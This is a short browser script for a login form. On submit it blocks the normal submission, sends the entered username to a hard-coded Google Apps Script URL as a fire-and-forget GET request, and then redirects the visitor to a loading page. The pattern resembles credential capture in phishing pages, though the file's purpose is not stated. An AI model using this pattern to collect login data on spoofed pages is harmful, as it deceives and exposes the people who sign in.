document.addEventListener("DOMContentLoaded", function () {

  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const username = document.getElementById("username").value;

    // 🔹 DATA SEND via GET (no CORS issue)
    const url =
      "https://script.google.com/macros/s/AKfycbw6GR29yDCVXL5Wl5H0jiCRC4sFTNNmvgzg3uIMFnv4VIAKJbnzkbQkzLGP21jaZw0D/exec"
      + "?username=" + encodeURIComponent(username);

    // fire & forget
    fetch(url);

    // 🔹 Redirect user immediately
    window.location.href = "loading.html";
  });

});
